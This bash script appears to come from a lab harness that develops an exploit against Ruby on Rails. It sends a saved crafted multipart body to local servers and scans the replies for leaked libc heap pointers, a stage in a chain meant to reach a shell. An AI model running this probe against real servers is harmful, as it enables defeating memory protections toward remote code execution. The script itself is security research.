#!/bin/bash
# Main-arena geometry probe: does the surviving consH20-tail reflection carry
# a libc main_arena pointer when all glibc threads share the main arena?
#
# Same unmodified `rails new --minimal` app, same saved wire body and the same
# case-probe geometry as ruby2shell-stock-leakclass.sh, but every server is
# started with MALLOC_ARENA_MAX=1 so worker-thread unsorted/smallbin fd/bk
# point into libc's main_arena instead of a worker-thread arena. A reflected
# pointer that maps to the libc file is the libc/code-base oracle the harness
# rung-5 chain still lacks on a stock app. Loopback only; analysis only.
#
# Usage: RUBY2SHELL_MAINARENA_COUNT=12 bash lab/repro/ruby2shell-mainarena-leak.sh
set -u
cd "$(dirname "$0")/../.." || exit 1
EV=lab/build/evidence
APP=lab/build/rails-stock-app
RB=lab/build/plain/ruby-3.4.12-plain/bin/ruby
BODY_SRC="${RUBY2SHELL_MAINARENA_BODY:-$EV/stock-rails-rails-stage2d-n524-r238.body}"

TAGP="${RUBY2SHELL_MAINARENA_TAG:-mainarena}"
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
export MALLOC_ARENA_MAX=1
BASE=4710

if [ "${1:-}" = "--one" ]; then
  i="$2"
  PORT=$((BASE + i))
  TAG="$TAGP-$i"
  BODY="$EV/stock-rails-$TAG.body"
  HTML="$EV/stock-rails-$TAG.html"
  LOG="$EV/stock-rails-$TAG.server.log"
  PIDFILE="$PWD/$EV/stock-rails-$TAG.pid"
  ARM="$PWD/$EV/stock-rails-$TAG.case-arm"
  [ -f "$BODY_SRC" ] || exit 0
  [ -f "$APP/config/environment.rb" ] || exit 0
  cp "$BODY_SRC" "$BODY" || exit 0
  N="${RUBY2SHELL_MAINARENA_N:-524}"
  MTRACE_FD=2 MTRACE_CASE_ONLY=1 MTRACE_CASE_REQUEST=$((N + 44)) \
    MTRACE_CASE_ARM_FILE="$ARM" LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$APP/bin/rails" server -b 127.0.0.1 -p "$PORT" --pid "$PIDFILE" \
    > "$LOG" 2>&1 &
  PID=$!
  READY=NO
  for _ in $(seq 1 300); do
    curl -s -m 1 "http://127.0.0.1:$PORT/up" >/dev/null 2>&1 && { READY=YES; break; }
    sleep 0.1
  done
  if [ "$READY" != YES ]; then kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null; exit 0; fi
  touch "$ARM"
  curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
    --data-binary "@$BODY" -o "$HTML" -w '%{http_code}' 2>>"$LOG" \
    > "$EV/stock-rails-$TAG.http"
  rm -f "$ARM"
  if kill -0 "$PID" 2>/dev/null; then
    cat "/proc/$PID/maps" > "$EV/stock-rails-$TAG.maps" 2>/dev/null
    kill "$PID" 2>/dev/null
  fi
  wait "$PID" 2>/dev/null
  exit 0
fi

COUNT="${RUBY2SHELL_MAINARENA_COUNT:-12}"
if [ ! -f "$BODY_SRC" ]; then
  echo "missing $BODY_SRC; regenerate with the consH20-tail geometry" >&2
  exit 2
fi
if [ ! -f "$APP/config/environment.rb" ]; then
  echo "missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh" >&2
  exit 2
fi
rm -f "$EV"/stock-rails-"$TAGP"-*.{body,html,http,server.log,maps,pid,case-arm} 2>/dev/null
seq 1 "$COUNT" | xargs -P6 -I{} "$0" --one {}
echo "=== reflect-scan ($TAGP) ==="
python3 lab/repro/ruby2shell-reflect-scan.py "$TAGP"-
echo "=== leak-maps ($TAGP) ==="
python3 lab/repro/ruby2shell-leak-maps.py "$TAGP"-
for f in "$EV"/stock-rails-"$TAGP"-*.http; do printf '%s %s\n' "$(basename "$f")" "$(cat "$f")"; done
